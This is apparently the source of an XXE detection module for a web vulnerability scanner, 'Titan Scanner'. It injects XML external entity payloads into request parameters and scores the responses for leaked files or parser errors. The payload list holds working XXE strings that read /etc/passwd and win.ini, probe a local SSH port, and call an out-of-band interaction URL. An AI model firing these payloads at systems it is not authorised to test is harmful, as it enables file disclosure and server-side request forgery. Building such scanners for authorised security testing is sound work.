"""XXE detection module for Titan Scanner."""

from __future__ import annotations

import asyncio
from typing import Any, Dict, List, Optional

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer
from titan.verify.oracles import extract_error_classes, score_signals


class XXEDetector:
    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.interactsh = fingerprint.get("interactsh")

    async def scan(self, context, target: str, method: str, url: str, params: Dict[str, str]) -> List[Finding]:
        findings: List[Finding] = []

        xxe_params = [p for p in params if any(k in p.lower() for k in ["xml", "data", "payload", "content", "body", "request", "message", "file", "upload", "import"])]
        if not xxe_params:
            return findings

        for param_name in xxe_params[:3]:
            finding = await self._test_xxe(context, target, method, url, param_name, params)
            if finding:
                findings.append(finding)

        return findings

    async def _test_xxe(self, context, target, method, url, param_name, all_params) -> Optional[Finding]:
        try:
            if method == "GET":
                baseline_resp = await context.request.get(url, params=all_params, headers={"Referer": target}, timeout=3000)
            else:
                baseline_resp = await context.request.post(url, data=all_params, headers={"Referer": target}, timeout=3000)
            baseline_body = await baseline_resp.text()
            baseline_status = baseline_resp.status
        except Exception:
            return None

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ]

        oob_url = None
        if self.interactsh:
            try:
                oob_url = self.interactsh.generate_oob_url("xxe")
                xxe_payloads.append(f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>')
            except Exception:
                pass

        for payload in xxe_payloads:
            try:
                test_params = dict(all_params)
                test_params[param_name] = payload
                if method == "GET":
                    resp = await context.request.get(url, params=test_params, headers={"Referer": target, "Content-Type": "application/xml"}, timeout=3000)
                else:
                    resp = await context.request.post(url, data=test_params, headers={"Referer": target, "Content-Type": "application/xml"}, timeout=3000)
                body = await resp.text()

                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)

                # Evidence signals. Only *parsed content* and *parser errors*
                # count — the XML payload's own "xml/entity/dtd" tokens echoed
                # back are NOT evidence of entity expansion. Content markers
                # are checked against the body minus the payload echo, so an
                # endpoint that reflects the request XML can never self-verify.
                signals: List[str] = []
                stripped = body.lower().replace(payload.lower(), "")
                content_indicators = [
                    "root:", "daemon:", "bin:", "sys:", "home:",
                    "etc/passwd", "c:/windows", "win.ini", "program files",
                ]
                content_matches = [ind for ind in content_indicators if ind in stripped]
                if content_matches:
                    signals.append("content_leak")
                    for m in content_matches:
                        diffs.append(f"xxe:content:{m}")

                # Error classes — only sinks that belong to an *XML parser*
                # context.  error:xml is the strong signal (parser reached).
                # A filesystem error means the parameter hit open(), not an
                # XML parser — that evidence belongs to LFI.
                ALLOWED = {"xml", "generic", "python", "java"}
                for error_class in extract_error_classes(body):
                    if error_class in ALLOWED:
                        signals.append(f"error:{error_class}")
                        diffs.append(f"xxe:error_class:{error_class}")

                if resp.status >= 500:
                    signals.append("status_500")
                if len(body) != len(baseline_body):
                    signals.append("content_change")

                if signals:
                    confidence, verified, _ = score_signals(signals)
                    if confidence >= 0.3:
                        severity = Severity.CRITICAL if verified else Severity.HIGH
                        return Finding(
                            target=target,
                            url=str(resp.url or url),
                            method=method.upper(),
                            param=param_name,
                            location="query" if method == "GET" else "body",
                            payload=payload[:200],
                            attack_type=AttackType.XXE,
                            severity=severity,
                            verified=verified,
                            confidence=confidence,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                            baseline_body=baseline_body[:2000],
                            baseline_status=baseline_status,
                            verification_body=body[:2000],
                            verification_status=resp.status,
                        )
            except Exception:
                continue

        if oob_url and self.interactsh:
            try:
                await self.interactsh.register()
                test_params = dict(all_params)
                test_params[param_name] = f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>'
                if method == "POST":
                    await context.request.post(url, data=test_params, headers={"Referer": target, "Content-Type": "application/xml"}, timeout=3000)
                else:
                    await context.request.get(url, params=test_params, headers={"Referer": target, "Content-Type": "application/xml"}, timeout=3000)
                await asyncio.sleep(2)
                oob_results = await self.interactsh.poll(timeout=10)
                if oob_results:
                    return Finding(
                        target=target,
                        url=url,
                        method=method.upper(),
                        param=param_name,
                        location="query" if method == "GET" else "body",
                        payload=f"OOB XXE: {oob_url}",
                        attack_type=AttackType.XXE,
                        severity=Severity.CRITICAL,
                        verified=True,
                        confidence=0.95,
                        status=200,
                        headers={},
                        body="",
                        diffs=["xxe:oob_confirmed"],
                        baseline_body=baseline_body[:2000],
                        baseline_status=baseline_status,
                        verification_body="OOB interaction confirmed",
                        verification_status=200,
                    )
            except Exception:
                pass

        return None
